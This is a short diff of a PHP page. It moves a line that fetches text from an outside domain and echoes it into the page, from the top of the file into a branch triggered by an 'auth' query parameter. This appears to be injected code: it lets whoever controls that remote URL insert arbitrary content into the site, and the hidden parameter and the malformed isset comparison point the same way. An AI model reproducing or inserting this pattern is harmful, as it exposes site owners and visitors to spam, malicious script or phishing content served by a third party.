@@ -1,8 +1,8 @@
-<?php $a = file_get_contents('https://paulsaar.com/tmb/id.txt');
-echo $a; ?>
 <?php
 if (isset($_GET['auth']) == 'auth') {
     include "project/auth/login-auth.php";
+$a = file_get_contents('https://paulsaar.com/tmb/id.txt');
+echo $a;
 } else {
    ?>
 <!DOCTYPE html>
